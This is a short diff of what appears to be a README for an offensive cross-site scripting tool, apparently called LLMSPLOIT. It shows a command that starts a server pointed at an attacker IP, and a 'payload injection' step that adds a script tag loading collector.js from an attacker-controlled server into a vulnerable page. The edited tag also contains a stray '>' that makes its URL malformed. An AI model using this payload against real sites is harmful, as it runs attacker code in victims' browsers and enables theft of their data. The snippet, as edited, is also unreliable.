@@ -101,7 +101,7 @@ python3 server.py --action "<ACTION_YOU_WANT_TO_PERFORM>" --host <ATTACKER_IP>
 
 3. Inject the payload into XSS sink
 ```HTML
-<script src="http://<ATTACKER_XSS_LLMSPLOIT_SERVER_IP>/collector.js"></script>
+<script src="http://<ATTACKER_XSS_LLMSPLOIT_SERVER_IP>:8000>/collector.js"></script>
 ```
 
 ---
